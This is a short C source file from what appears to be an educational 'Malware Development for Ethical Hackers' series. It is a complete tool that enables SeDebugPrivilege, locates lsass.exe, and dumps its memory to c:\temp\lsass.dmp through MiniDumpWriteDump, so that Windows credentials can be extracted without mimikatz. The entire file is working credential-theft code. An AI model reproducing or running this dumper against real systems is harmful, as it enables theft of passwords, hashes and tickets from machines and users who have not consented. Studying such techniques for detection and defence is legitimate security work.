/*
 * Malware Development for Ethical Hackers
 * hack.c - Extract lsass data without mimikatz. C++ implementation
 * author: @cocomelonc
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#pragma comment (lib, "dbghelp.lib")

int locateTargetProcess(const char *targetProcName) {

  HANDLE processSnapshot;
  PROCESSENTRY32 processEntry;
  int processID = 0;
  BOOL operationResult;

  // snapshot of all processes in the system
  processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == processSnapshot) return 0;

  // initializing size: needed for using Process32First
  processEntry.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  operationResult = Process32First(processSnapshot, &processEntry);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (operationResult) {
    // if we find the process: return process ID
    if (strcmp(targetProcName, processEntry.szExeFile) == 0) {
      processID = processEntry.th32ProcessID;
      break;
    }
    operationResult = Process32Next(processSnapshot, &processEntry);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(processSnapshot);
  return processID;
}

// set privilege
BOOL enablePrivilege(LPCTSTR privilegeName) {
  HANDLE processToken;
  TOKEN_PRIVILEGES tokenPrivileges;
  LUID privilegeLUID;
  BOOL result = TRUE;

  if (!LookupPrivilegeValue(NULL, privilegeName, &privilegeLUID)) result = FALSE;

  tokenPrivileges.PrivilegeCount = 1;
  tokenPrivileges.Privileges[0].Luid = privilegeLUID;
  tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &processToken)) result = FALSE;
  if (!AdjustTokenPrivileges(processToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) result = FALSE;
  printf(result ? "successfully enabled %s :)\n" : "failed to enable %s :(\n", privilegeName);
  return result;
}

// create minidump of lsass.exe
BOOL generateMiniDump() {
  bool dumpSuccess = FALSE;
  int processID = locateTargetProcess("lsass.exe");
  HANDLE processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, processID);
  HANDLE outputHandle = CreateFile((LPCTSTR)"c:\\temp\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (processHandle && outputHandle != INVALID_HANDLE_VALUE) {
    dumpSuccess = MiniDumpWriteDump(processHandle, processID, outputHandle, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
    printf(dumpSuccess ? "successfully dumped to lsass.dmp :)\n" : "failed to dump :(\n");
  } 
  return dumpSuccess; 
}

int main(int argc, char* argv[]) {
  if (!enablePrivilege(SE_DEBUG_NAME)) return -1;
  if (!generateMiniDump()) return -1;
  return 0;
}
